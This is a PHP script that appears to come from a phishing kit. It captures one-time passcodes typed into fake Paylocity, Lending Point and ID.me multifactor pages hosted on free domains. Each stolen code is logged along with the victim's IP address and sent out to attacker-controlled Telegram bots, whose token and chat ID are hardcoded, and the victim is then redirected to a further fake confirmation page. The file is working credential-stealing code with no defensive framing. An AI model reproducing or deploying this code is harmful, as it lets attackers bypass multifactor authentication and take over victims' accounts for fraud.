<?php
// ===================================
// 🔐 UNIVERSAL OTP HANDLER (Multi-site)
// ===================================
include 'firewall.php';

// === Domain-specific bot + redirect map ===
$site_map = [
    'paylocitylive.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => 'BOT_TOKEN_1B', 'chat_id' => 'CHAT_ID_1B']
        ],
        'redirect' => 'https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
    ],

    'lending-point.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388']
        ],
        'redirect' => 'https://lending-point.rf.gd/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
    ]
];


// === Logger setup ===
$log_file = 'submission_log.txt';
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// === Telegram sender ===
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// === Main logic ===
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $otp = htmlspecialchars($_POST['userotp'] ?? '???');
    $ip  = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $parsed = parse_url($referer);
    $domain = $parsed['host'] ?? 'unknown';
    $timestamp = date("Y-m-d H:i:s");

    $msg = "🔐 *OTP Received from $domain*\n\n" .
           "🔢 *Code:* $otp\n" .
           "🌐 *IP:* $ip\n" .
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] OTP: $otp | IP: $ip", $log_file);

    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($msg, $config['bots']);
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        exit("Unauthorized");
    }
}
?>
